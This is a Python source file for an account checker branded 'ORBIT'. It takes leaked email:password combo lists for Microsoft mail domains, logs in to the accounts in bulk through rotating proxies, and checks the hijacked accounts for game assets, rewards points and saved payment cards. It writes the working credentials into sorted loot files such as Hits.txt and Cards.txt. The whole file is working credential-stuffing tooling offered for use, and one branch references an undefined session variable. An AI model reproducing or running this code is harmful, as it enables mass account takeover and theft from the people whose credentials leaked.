"""
ORBIT Checker Engine v29 — Complete rebuild
Uses archive engines with correct method calls, verified signatures.
"""
import re, os, time, queue, threading, logging
from datetime import datetime
from typing import Optional, Dict, List
logger = logging.getLogger(__name__)


class CheckerEngine:
    def __init__(self, session_id=None, mode=7, threads=50,
                 lines=None, combos=None, proxy_rotator=None, keywords=None,
                 scan_id=None):
        self.scan_id       = session_id or scan_id or 'scan'
        self.mode          = mode
        self.threads       = min(int(threads), 500)
        self.combos        = lines or combos or []
        self.proxy_rotator = proxy_rotator
        self.keywords      = keywords or []
        # Alias for bot.py compatibility
        self.lines         = self.combos
        self.input_queue   = queue.Queue()
        self.lock          = threading.Lock()
        self.running       = True
        self.stopped       = False
        self.paused        = False
        self.start_time: Optional[datetime] = None
        self.results       = {'hits': [], '2fa': [], 'bad': [], 'errors': []}
        self.stats         = {
            'total': 0, 'checked': 0, 'hits': 0,
            'twofa': 0, 'bad': 0, 'errors': 0, 'cpm': 0,
            # Service-specific counts for live stats display
            'xgpu': 0, 'xgp': 0, 'minecraft': 0, 'supercell': 0,
            'roblox': 0, 'crunchyroll_premium': 0, 'payment': 0,
            'capes': 0, 'banned': 0, 'tiktok': 0,
        }

    # ── Proxy ──────────────────────────────────────────────────────────────────
    def get_proxy(self) -> Optional[Dict]:
        try:
            if self.proxy_rotator and self.proxy_rotator.count() > 0:
                url = self.proxy_rotator.get_next()
                if url:
                    return {'http': url, 'https': url}
        except Exception:
            pass
        return None

    # ── Single account check ───────────────────────────────────────────────────
    def check_one(self, email: str, password: str) -> Dict:
        result = {'email': email, 'password': password, 'status': 'ERROR'}

        # ── STEP 1: Login via HotmailChecker (direct connection = reliable PPFT)
        # login_only=True skips inbox scan for speed; modes 1+6 do full scan
        hc_result = {}
        try:
            from checkers.scanner_engine import HotmailChecker
            hc = HotmailChecker()
            full_scan = self.mode in (1, 6)
            hc_result = hc.check_account(
                email, password,
                keywords=self.keywords if full_scan else None,
                login_only=not full_scan
            )
            st = hc_result.get('status', 'ERROR')
            result['status'] = st
            if st == 'HIT':
                # Carry profile/services/keywords from full scan
                for k in ('profile','services','service_counts',
                          'psn_details','inbox_matches','keyword_hits'):
                    if hc_result.get(k):
                        result[k] = hc_result[k]
                # access_token + cid for enrichment
                result['_access_token'] = hc_result.get('access_token','')
                result['_cid']          = hc_result.get('cid','')
        except Exception as e:
            logger.debug(f"login {email}: {e}")
            result['status'] = 'ERROR'

        if result['status'] != 'HIT':
            result.pop('_access_token', None)
            result.pop('_cid', None)
            return result

        # Access token and CID for enrichment
        _tok = result.pop('_access_token', '')
        _cid = result.pop('_cid', '')

        # ── Mode 7: Speed — login only ─────────────────────────────────────────
        if self.mode == 7:
            return result

        # ── Mode 2: Supercell ──────────────────────────────────────────────────
        elif self.mode == 2:
            if _tok and _cid:
                try:
                    from checkers.supercell_engine import SupercellScanner
                    sc_data = SupercellScanner.search_supercell_emails(_tok, _cid, email)
                    if sc_data and sc_data.get('found'):
                        games = SupercellScanner.analyze_games(sc_data)
                        result.update(games)
                        result['has_supercell'] = True
                except Exception as e:
                    logger.debug(f"supercell {email}: {e}")
            if not result.get('has_supercell'):
                try:
                    from checkers.imap_inbox import IMAPInboxEngine
                    ir = IMAPInboxEngine().check_account(email, password, keyword='supercell.com')
                    if ir and ir.get('status') == 'SUCCESS':
                        result['has_supercell'] = True
                except Exception: pass

        # ── Mode 3: Roblox (IMAP) ──────────────────────────────────────────────
        elif self.mode == 3:
            try:
                from checkers.imap_inbox import IMAPInboxEngine
                ir = IMAPInboxEngine().check_account(email, password, keyword='roblox.com')
                if ir and ir.get('status') == 'SUCCESS':
                    result['has_roblox'] = True
                    result['rb_emails']  = ir.get('emails_found', 0)
            except Exception as e:
                logger.debug(f"roblox {email}: {e}")

        # ── Mode 4: Xbox — meow_engine XBL→XSTS chain ───────────────────────────
        elif self.mode == 4:
            _sess = hc_result.get('session')
            if _sess and _tok:
                try:
                    from checkers.meow_engine import get_xbox_token, get_xbl_xsts, checkownership
                    _xb_tok = get_xbox_token(_sess, _tok)
                    if _xb_tok:
                        _xsts_res = get_xbl_xsts(_sess, _xb_tok)
                        if _xsts_res:
                            _xsts, _uhs = _xsts_res
                            # XSTS for Xbox profile (not MC)
                            try:
                                import requests as _rx
                                _gp = _rx.Session()
                                _gp.headers['Authorization'] = f'XBL3.0 x={_uhs};{_xsts}'
                                _gp.headers['x-xbl-contract-version'] = '2'
                                _pr = _gp.get('https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag', timeout=8)
                                if _pr.status_code == 200:
                                    for sv in (_pr.json().get('profileUsers',[{}])[0].get('settings',[])):
                                        if sv.get('id') == 'Gamertag':
                                            result['gamertag'] = sv.get('value','')
                                            result['has_xbox']  = True
                            except Exception: pass
                except Exception as e:
                    logger.debug(f"xbox {email}: {e}")

        # ── Mode 5: PSN ────────────────────────────────────────────────────────
        elif self.mode == 5:
            if _tok:
                try:
                    from checkers.PSN_Checker import PSNSearcher
                    psn = PSNSearcher(_tok)
                    emails = psn.get_psn_emails()
                    if emails:
                        res = psn.analyze()
                        if res:
                            result['has_psn']     = True
                            result['psn_details'] = res
                except Exception as e:
                    logger.debug(f"psn {email}: {e}")

        # ── Mode 6: Full Scan (results already in hc_result) ──────────────────
        elif self.mode == 6:
            # Profile info
            prof = result.get('profile') or {}
            if prof.get('country'):      result['country']      = prof['country']
            if prof.get('name'):         result['display_name'] = prof['name']
            # Rewards + Payment via meow_engine (session-based, no re-login)
            _sess6 = hc_result.get('session')
            if _sess6:
                try:
                    from checkers.meow_engine import check_rewards, check_payment, check_subscriptions
                    _rw = check_rewards(_sess6)
                    if _rw: result['rewards_points'] = _rw
                except Exception: pass
                try:
                    from checkers.meow_engine import check_payment
                    _cards = check_payment(_sess6)
                    if _cards: result['payment_methods'] = _cards
                except Exception: pass

        # ── Mode 8: Minecraft — meow_engine XBL→XSTS→MC chain ───────────────────
        elif self.mode == 8:
            _sess = hc_result.get('session')
            if _sess and _tok:
                try:
                    from checkers.meow_engine import (get_xbox_token, get_xbl_xsts,
                                                       get_mc_token, check_minecraft)
                    _xb_tok = get_xbox_token(_sess, _tok)
                    if _xb_tok:
                        _xsts_res = get_xbl_xsts(_sess, _xb_tok)
                        if _xsts_res:
                            _xsts, _uhs = _xsts_res
                            _mc_tok = get_mc_token(_sess, _uhs, _xsts)
                            if _mc_tok:
                                _mc = check_minecraft(_sess, _mc_tok)
                                result.update(_mc)
                except Exception as e:
                    logger.debug(f"mc {email}: {e}")
            # MCEngine fallback if meow chain failed
            if not result.get('has_mc') and _tok:
                try:
                    from checkers.mc_engine import MCEngine
                    cap = MCEngine().check_account(email, password)
                    at  = getattr(cap,'account_type','ERROR') if cap else 'ERROR'
                    if at not in ('BAD','ERROR','Unknown',None,''):
                        result['has_mc']   = True
                        result['username'] = getattr(cap,'gamertag','') or ''
                        _c = getattr(cap,'capes','None')
                        result['capes']    = [_c] if _c and _c != 'None' else []
                        result['has_xgp']  = 'Game Pass' in str(at)
                        result['xgp_type'] = at if result['has_xgp'] else ''
                        result['name_change'] = getattr(cap,'name_change_allowed',False)
                        result['hypixel']  = {
                            'level':    getattr(cap,'hypixel_level',None),
                            'bw_stars': getattr(cap,'bedwars_stars',None),
                            'sb_coins': getattr(cap,'skyblock_coins',None),
                        }
                except Exception: pass

        # ── Mode 9: MS Payment — meow_engine session-based ───────────────────────
        elif self.mode == 9:
            _sess9 = hc_result.get('session')
            if _sess9:
                try:
                    from checkers.meow_engine import check_rewards
                    _rw = check_rewards(_sess9)
                    if _rw: result['rewards_points'] = _rw
                except Exception: pass
                try:
                    from checkers.meow_engine import check_payment, check_subscriptions
                    _cards = check_payment(_sess9)
                    if _cards:
                        result['payment_methods'] = _cards
                        result['has_payment']     = True
                    _subs = check_subscriptions(_sess9)
                    if _subs: result['subscriptions'] = _subs
                except Exception: pass

        # ── Mode 10: Crunchyroll ───────────────────────────────────────────────
        elif self.mode == 10:
            try:
                from checkers.crunchyroll_engine import CrunchyrollAccountChecker
                cr = CrunchyrollAccountChecker().check_account(email, password)
                if cr and isinstance(cr, dict):
                    result['crunchyroll_premium'] = cr.get('is_premium', False)
                    result['cr_plan']             = cr.get('plan','')
            except Exception as e:
                logger.debug(f"cr {email}: {e}")

        # ── Mode 1: All-in-One ─────────────────────────────────────────────────
        elif self.mode == 1:
            # Profile from scanner
            prof = result.get('profile') or {}
            if prof.get('country'): result['country']      = prof['country']
            if prof.get('name'):    result['display_name'] = prof['name']

            # PSN (already in hc_result for mode 1 full scan)
            if (result.get('psn_details') or {}).get('has_psn'):
                result['has_psn'] = True

            # Minecraft
            try:
                from checkers.mc_engine import MCEngine
                cap = MCEngine().check_account(email, password)
                at  = getattr(cap,'account_type','') if cap else ''
                if at not in ('BAD','ERROR','Unknown',None,''):
                    result['has_mc']   = True
                    result['username'] = getattr(cap,'gamertag','')
                    result['capes']    = [getattr(cap,'capes','None')] \
                                        if getattr(cap,'capes','None') != 'None' else []
                    result['has_xgp']  = 'Game Pass' in str(at)
                    result['xgp_type'] = at if result['has_xgp'] else ''
                    result['hypixel']  = {
                        'level':    getattr(cap,'hypixel_level',None),
                        'bw_stars': getattr(cap,'bedwars_stars',None),
                        'sb_coins': getattr(cap,'skyblock_coins',None),
                    }
            except Exception: pass

            # Supercell via token
            if _tok and _cid:
                try:
                    from checkers.supercell_engine import SupercellScanner
                    sc_data = SupercellScanner.search_supercell_emails(_tok, _cid, email)
                    if sc_data and sc_data.get('found'):
                        games = SupercellScanner.analyze_games(sc_data)
                        result.update(games)
                        result['has_supercell'] = True
                except Exception: pass

            # Rewards via meow_engine (session-based)
            if _sess1:
                try:
                    from checkers.meow_engine import check_rewards as _cr1
                    _rw1 = _cr1(_sess1)
                    if _rw1: result['rewards_points'] = _rw1
                except Exception: pass

            # Crunchyroll
            try:
                from checkers.crunchyroll_engine import CrunchyrollAccountChecker
                cr = CrunchyrollAccountChecker().check_account(email, password)
                if cr and isinstance(cr,dict) and cr.get('is_premium'):
                    result['crunchyroll_premium'] = True
                    result['cr_plan'] = cr.get('plan','')
            except Exception: pass

        return result

    # ── Worker ─────────────────────────────────────────────────────────────────
    def worker(self):
        while self.running and not self.stopped:
            if self.paused:
                time.sleep(0.1); continue
            try:
                email, password = self.input_queue.get(block=True, timeout=1.0)
            except queue.Empty:
                continue
            try:
                result = self.check_one(email, password)
                # Retry once on ERROR — network hiccup
                if result.get('status') == 'ERROR':
                    result = self.check_one(email, password)
            except Exception as e:
                result = {'email': email, 'password': password, 'status': 'ERROR'}
                logger.debug(f"worker: {e}")

            st = result.get('status', 'ERROR')
            with self.lock:
                self.stats['checked'] += 1
                if st == 'HIT':
                    self.stats['hits'] += 1
                    self.results['hits'].append(result)
                    # Track service-specific stats
                    if result.get('has_xgp'):
                        t = str(result.get('xgp_type','')).upper()
                        if 'ULTIMATE' in t or t == 'XGPU':
                            self.stats['xgpu'] += 1
                        else:
                            self.stats['xgp'] += 1
                    if result.get('has_mc'):   self.stats['minecraft'] += 1
                    if result.get('has_supercell'): self.stats['supercell'] += 1
                    if result.get('has_roblox'):    self.stats['roblox'] += 1
                    if result.get('crunchyroll_premium'): self.stats['crunchyroll_premium'] += 1
                    if result.get('payment_methods'):    self.stats['payment'] += 1
                    if result.get('capes'):              self.stats['capes'] += 1
                elif st == '2FA':
                    self.stats['twofa']  += 1
                    self.results['2fa'].append(result)
                elif st == 'BAD':
                    self.stats['bad']    += 1
                elif st == 'ERROR':
                    self.stats['errors'] += 1
                elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 1
                if elapsed > 0:
                    self.stats['cpm'] = int(self.stats['checked'] / elapsed * 60)
            self.input_queue.task_done()

    # ── Queue ──────────────────────────────────────────────────────────────────
    def load_queue(self):
        VALID = {
            'hotmail.com','hotmail.co.uk','hotmail.fr','hotmail.de','hotmail.it',
            'hotmail.es','hotmail.nl','hotmail.be','outlook.com','outlook.fr',
            'outlook.de','outlook.it','outlook.es','outlook.co.uk','outlook.jp',
            'outlook.com.au','live.com','live.co.uk','live.fr','live.de','live.it',
            'live.nl','live.be','live.com.mx','live.ca','live.jp',
            'msn.com','windowslive.com','passport.com',
        }
        seen, valid = set(), []
        for line in self.combos:
            line = line.strip()
            if ':' not in line: continue
            em, pw = line.split(':', 1)
            em = em.strip().lower(); pw = pw.strip()
            if not em or not pw: continue
            dom = em.split('@')[-1] if '@' in em else ''
            if dom not in VALID: continue
            if f"{em}:{pw}" in seen: continue
            seen.add(f"{em}:{pw}"); valid.append((em, pw))
        self.stats['total'] = len(valid)
        for em, pw in valid:
            self.input_queue.put((em, pw))

    # ── Start/Stop/Pause ───────────────────────────────────────────────────────
    def start(self):
        self.load_queue()
        self.start_time = datetime.now()
        workers = [threading.Thread(target=self.worker, daemon=True)
                   for _ in range(self.threads)]
        for t in workers: t.start()
        for t in workers: t.join()
        self.running = False

    def stop(self):   self.stopped = True; self.running = False
    def pause(self):  self.paused  = True
    def resume(self): self.paused  = False

    def get_stats(self) -> Dict:
        with self.lock: return self.stats.copy()

    def is_finished(self) -> bool:
        if self.stopped: return True
        if not self.running: return True
        total = self.stats.get('total', 0)
        if total == 0: return False
        return self.input_queue.empty() and self.stats['checked'] >= total

    # ── Save results ───────────────────────────────────────────────────────────
    def save_results_to_files(self, folder: str) -> List[str]:
        os.makedirs(folder, exist_ok=True)
        written = []
        WM = "☁️ ORBIT Hotmail Checker"

        def write(path, line):
            fp = os.path.join(folder, path)
            os.makedirs(os.path.dirname(fp), exist_ok=True)
            new = not os.path.exists(fp)
            with open(fp, 'a', encoding='utf-8', errors='replace') as f:
                if new: f.write(f"{WM}\n{'─'*44}\n")
                f.write(line + '\n')
            if fp not in written: written.append(fp)

        for r in self.results.get('hits', []):
            em, pw = r.get('email','?'), r.get('password','?')
            combo  = f"{em}:{pw}"
            write('Hits.txt', combo)

            if r.get('has_xgp'):
                gt = r.get('gamertag','N/A')
                t  = str(r.get('xgp_type','')).upper()
                write('XGPU.txt' if 'ULTIMATE' in t or t=='XGPU' else 'XGP.txt',
                      f"{combo} | GT:{gt}")
            if r.get('has_xbox') or r.get('gamertag'):
                write('Xbox.txt', f"{combo} | GT:{r.get('gamertag','N/A')}")

            if r.get('has_mc'):
                mc = f"{combo} | MC:{r.get('username','N/A')}"
                if r.get('capes'): mc += f" | Capes:{','.join(r['capes'])}"
                write('Minecraft.txt', mc)
                if any('optifine' in str(c).lower() for c in (r.get('capes') or [])):
                    write('Optifine.txt', f"{combo} | MC:{r.get('username','N/A')}")
                if r.get('name_change'):
                    write('Namechangeable.txt', f"{combo} | MC:{r.get('username','N/A')}")

            hyp = r.get('hypixel') or {}
            lvl = hyp.get('level')
            if lvl and str(lvl) not in ('N/A','None','0',None,''):
                hp = [combo, f"Lvl:{lvl}"]
                if hyp.get('bw_stars'): hp.append(f"BW:{hyp['bw_stars']}⭐")
                if hyp.get('sb_coins'): hp.append(f"Coins:{hyp['sb_coins']}")
                write('Hypixel.txt', ' | '.join(hp))

            for card in (r.get('payment_methods') or []):
                d = card.get('display', str(card)) if isinstance(card,dict) else str(card)
                write('Cards.txt', f"{combo} | {d}")
            if r.get('balance') and str(r.get('balance')) not in ('','None','$0'):
                write('Balance.txt', f"{combo} | Balance:{r['balance']}")

            rp = r.get('rewards_points')
            if rp and str(rp) not in ('0','None',''):
                write('Rewards.txt', f"{combo} | Points:{rp}")

            if r.get('has_psn'):
                psn = r.get('psn_details') or {}
                pl  = combo
                ids = psn.get('online_ids') or psn.get('id') or psn.get('psn_id','')
                if ids: pl += f" | ID:{','.join(ids) if isinstance(ids,list) else ids}"
                if psn.get('orders'): pl += f" | Orders:{psn['orders']}"
                write('PSN.txt', pl)

            if r.get('has_supercell') or r.get('sc_has_supercell'):
                sl = combo
                if r.get('sc_coc_tag'): sl += f" | CoC:{r['sc_coc_tag']}"
                if r.get('sc_cr_tag'):  sl += f" | CR:{r['sc_cr_tag']}"
                if r.get('sc_bs_tag'):  sl += f" | BS:{r['sc_bs_tag']}"
                write('Supercell.txt', sl)

            if r.get('has_roblox') or r.get('rb_has_roblox'):
                rl = combo
                if r.get('rb_username'): rl += f" | User:{r['rb_username']}"
                if r.get('rb_robux'):    rl += f" | Robux:{r['rb_robux']}"
                write('Roblox.txt', rl)

            if r.get('crunchyroll_premium') or r.get('is_premium'):
                write('Crunchyroll.txt',
                      f"{combo} | Plan:{r.get('cr_plan','Premium')}")

            country = (r.get('country') or
                       (r.get('profile') or {}).get('country') or '')
            if country and country not in ('','None','Unknown'):
                safe = re.sub(r'[^A-Z0-9]','',str(country).upper())[:6] or 'XX'
                write(f'Countries/{safe}.txt', combo)

            for kw, cnt in (r.get('keyword_hits') or {}).items():
                if cnt and str(cnt) != '0':
                    safe = re.sub(r'\W','_',str(kw).lower())[:30]
                    write(f'Keywords/{safe}.txt', f"{combo} | {kw}:{cnt}")
            for m in (r.get('inbox_matches') or []):
                if isinstance(m, dict) and m.get('keyword'):
                    safe = re.sub(r'\W','_',m['keyword'].lower())[:30]
                    write(f'Keywords/{safe}.txt', f"{combo} | {m['keyword']}:{m.get('count',1)}")

            svcs = r.get('services') or []
            for svc in svcs:
                safe = re.sub(r'\W','_',str(svc).lower())[:30]
                write(f'Services/{safe}.txt', combo)

        for r in self.results.get('2fa', []):
            write('2FA.txt', f"{r.get('email','?')}:{r.get('password','?')}")

        return written
